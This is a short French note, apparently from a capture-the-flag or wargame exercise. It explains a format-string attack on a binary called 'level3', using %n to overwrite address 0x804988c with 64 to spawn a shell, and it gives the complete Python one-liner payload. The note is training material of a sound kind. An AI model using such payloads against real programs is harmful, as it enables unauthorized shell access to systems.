
https://www.exploit-db.com/papers/23985


utilise le %n pour ecrire à l'adresse d'eip et la suivante systeme et son argument

dans v()
si 0x804988c == 64 alors on a un shell

donc avec %n on modifie le contenu de cette adresse. (python -c "print '\x8c\x98\x04\x08' + 'a'*60 + '%4\$n'" ; cat) | ./level3 
